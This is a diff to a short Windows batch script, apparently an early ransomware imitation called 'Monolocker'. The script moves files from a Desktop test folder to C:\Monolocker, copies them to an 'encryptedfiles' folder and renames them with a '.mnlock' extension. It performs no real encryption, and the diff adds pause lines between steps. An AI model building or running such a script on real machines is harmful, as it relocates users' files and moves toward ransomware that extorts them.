@@ -1,12 +1,22 @@
-@echo off
+pause
 cd c:\
+pause
 md Monolocker
+pause
 cd C:\
+pause
 move /y %userprofile%\Desktop\test\*.* c:\Monolocker
+pause
 cd %userprofile%\Desktop
+pause
 md encryptedfiles
+pause
 cd c:\
+pause
 xcopy c:\Monolocker\*.* %userprofile%\Desktop\encryptedfiles *.* /e
+pause
 cd %userprofile%\Desktop\encryptedfiles
+pause
 rename *.* *.mnlock
+pause
 type nul >> %userprofile%\Desktop\encryptedfiles\*.mnlock
